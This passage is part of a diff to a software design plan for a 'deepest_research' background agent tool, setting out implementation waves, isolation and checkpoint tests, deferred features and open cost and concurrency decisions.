+| **R3** | **Concurrent execution lane** — reuse `TaskRunner`/`LoopTurnExecutor` headless context + pass `tree=`; a detached concurrent task with its own watchdog + cancellation. | A deepest run does **not** block a concurrent scheduled task or a second deepest run (proves *concurrent*, not merely *elsewhere*). Watchdog cancels a runaway. |
+| **R4** | **Trusted run-context + seed isolation** — the seed path for `max_depth=2`; all lane DB access on an **RLS-scoped session** via the storage abstraction. | Isolation test: the lane session cannot read another domain's rows and cannot mint a tree with any scope the interactive path lacks; a non-deepest seed cannot produce `max_depth>1`. |
+| **R5** | **Checkpoint / resume** — `research_run_state` (RLS `external` + isolation test), round-boundary commit, `TreeState` absolute-deadline + counter-rewind, mirroring `media_analysis_results`/0138. | Kill-mid-run → resume **continues from the last committed round and produces a coverage-equivalent report** over the accumulated findings (assert findings/source superset + a completed report — **not** byte-equality; LLM calls are non-seeded). |
+| **R6** | **Progress channel** (§3.5) — per-round transcript-append via `AgentTranscript.record_exchange` + a `NotifyBus`/FCM per-round nudge (`ref=session_id`). | A running deepest run posts a progress turn each round that renders in the initiating chat on reload; a nudge wakes a closed app; owner-RLS holds. |
+| **R7** | **Kickoff tool + cost governance + report landing** — `deepest_research` `.tool` sidecar (enqueue-and-return); owner ceiling shown with the §4 residual; **tool-aware** dedup so deep/deepest coexist; persist the report at round-commit so a post-synthesis ceiling-hit still lands it. | Ceiling enforced as the terminal bound; a deep + deepest report on the same question coexist; owner notified on finish. |
+| **R8** | **Frontend** — a run-screen entry for an in-flight deepest run + the finished-report provenance view (tiers/rounds/tokens/resume-count). | **GUI gate (PROCESS.md):** three interactive HTML mocks → owner picks → binding mock lands in `docs/mocks/` *before* implementation. |
 
 Tests land with each wave (`CLAUDE.md` rule 5): real Postgres via testcontainers,
-LLM faked, 80% backend coverage, security paths (the two isolation tests) at 100%.
+LLM + web faked, 80% backend coverage, security paths (the R2 + R4 isolation
+tests) at 100%. **Dependencies:** R3 is additionally gated on `deep_research` Open
+decision 2 (in-turn vs deferred) resolving toward "deferred" — until the base
+tool's on-box timing forces deferral, the background lane is speculative.
+**Dev-setup:** the lane is expected to add **no new runtime dependency** (it reuses
+the existing async/process substrate); if that proves false, `scripts/dev-setup.sh`
+is updated in the same PR (rule 8) and the dep flagged in the wave.
 
 ---
 
-## 7. Relationship to `deep_research`
+## §7. Relationship to `deep_research`
 
-`deepest_research` does **not** replace `deep_research`. The bounded, single-turn
-tool stays the default — it is the right answer for most "research this properly"
-asks (minutes, one turn, watch it live). `deepest_research` is the escalation for
-a genuinely large, open question worth an hour and a real token budget. jerv's
-prompt gains one line steering the rare deepest-worthy question to it, exactly as
-it steers a quick lookup away from `deep_research` today. The DR1 spike may ship as
-a `mode` on the existing tool before the two diverge into separate tools at DR5.
-
----
-
-## 8. Deferred past this plan
-
-- **Rich live-fan streaming from a background run.** The in-request tool streams the
-  live sub-agent fan + the report being written (`ToolProgressEvent` `preview`).
-  A background run surfaces only coarse `progress_note`-grade status until an
-  SSE-from-background transport is built — a separate front-end/transport job.
-- **Depth 3+.** The two-tier cap is deliberate (settled decision 2). A third tier
-  revisits only if two proves insufficient *and* the §4 argument is re-run for the
-  added tier.
-- **True free-form depth-1 spawning** (a raw spawn tool for task agents, vs the
-  structured decomposition of §3.2) — not needed for the two-tier model; would
-  widen the laundering surface without a matching gain.
-- **KB-scoped deepest research** (over the owner's notes/wiki) — inherits
-  `deep_research`'s deferral; a curator-side RLS surface, out of scope here.
+`deepest_research` does **not** replace `deep_research` — the bounded, single-turn
+tool stays the default for most "research this properly" asks. `deepest_research`
+is the escalation for a genuinely large, open question worth an hour and a real
+budget. The R1 spike ships as a `mode=deepest` on the existing tool before the two
+diverge into separate tools at R7. jerv's prompt gains one line steering a rare
+deepest-worthy question to it. **This plan is grounded on an in-progress
+substrate** (`deep_research` is In progress, not shipped); if R1 needs the
+deep-research spine merged first, that is an explicit dependency.
 
 ---
 
-## 9. Open decisions (owner to confirm on pickup)
+## §8. Deferred past this plan
 
-1. **Default per-run ceiling** — the token + wall-clock defaults (and hard maxes) a
-   run carries when the owner doesn't override. Needs a number grounded in on-box
-   cost.
-2. **Per-tier caps** — the tree total for a two-tier run, and the per-task-agent
-   sub-fan cap `K`. Sized from a real run once DR2 lands.
-3. **Concurrency of runs** — one deepest run at a time (simplest; a global lock) vs
-   a small pool. Affects the lane design in DR3.
-4. **Ship path for DR1** — a `mode=deepest` on `deep_research` (fastest) vs a
-   separate tool from the start. Recommended: `mode` for the spike, split at DR5.
+- **Live, in-place progress into an already-open chat surface** between turns. No
+  per-session standing channel exists (`_LiveTurn` is per-run and dies with the
+  turn; the PWA holds no standing per-session stream; `NotifyBus` SSE targets the
+  native app, not the PWA chat). A session-keyed SSE/WS is a separate transport
+  project; R6's transcript-append + nudge is the shipped-substrate path.
+- **Depth 3+** — the two-tier cap is deliberate; a third tier reopens the §4
+  argument for the added tier.
+- **True free-form depth-1 spawning** — the structured decomposition (§4) is the
+  only depth-1 affordance; a raw spawn tool would widen the exfil surface for no
+  gain.
+- **Injection-heuristic ceiling tightening** (§4 residual) and **KB-scoped deepest
+  research** — both out of scope, named.
 
 ---
 
-_Grounded in a substrate map of `backend/src/jbrain/{agent,workflow,external}`
-(spawn fan, tree caps, workflow engine, research-report RLS) verified 2026-07-22.
-Companion to the shipped `../plans/DEEP_RESEARCH_TOOL_PLAN.md`._
+## §9. Open decisions + promotion checklist (on pickup)
+
+**Open decisions (owner):**
+1. **Blocking measurement — token ↔ wall-clock ↔ dollar.** The draft's "50–100M
+   tokens / 30–60 min" is internally inconsistent with the base tool's measured
+   ~8M tree / ~28 min (→ 50–100M ≈ 3–6 h, not 30–60 min). Resolve on-box *before*
+   R0 is designed; the kickoff cost estimate and the "minutes-to-hours" framing
+   depend on it.
+2. **Default per-run ceiling** (token + wall-clock defaults + hard maxes), grounded
+   in on-box cost.
+3. **Per-tier caps** — the two-tier tree total and `K` (the §4 blocker) — sized
+   from a real run once R2 lands.
+4. **Run concurrency** — one deepest run at a time (a global lock) vs a small pool
+   (affects R3).
+
+**Promotion checklist (DOC_LIFECYCLE + proposed/README).** On pickup: flip
+`Status: Scheduled`; `git mv` this file `proposed/ → plans/`; add a `ROADMAP.md`
+slot (near the in-progress deep-research lines); add a `plans/README.md` row;
+confirm each net-new artifact maps to its non-negotiable (the `research_run_state`
++ RLS isolation test, the R4 seed-isolation test, the `.prompt`/`.tool` sidecars
+with the version-bump guard, storage-abstraction/RLS-scoped session for all lane
+DB access, `dev-setup.sh` currency).
+
+---
+
+_Grounded in a substrate map of `backend/src/jbrain/{agent,workflow,tasks,external,
+notify,push,api}` + `frontend/src/agent` and five adversarial reviews (security,
+feasibility, cost/value, process, progress-transport), all 2026-07-22. Companion
+to the in-progress `../plans/DEEP_RESEARCH_TOOL_PLAN.md`._
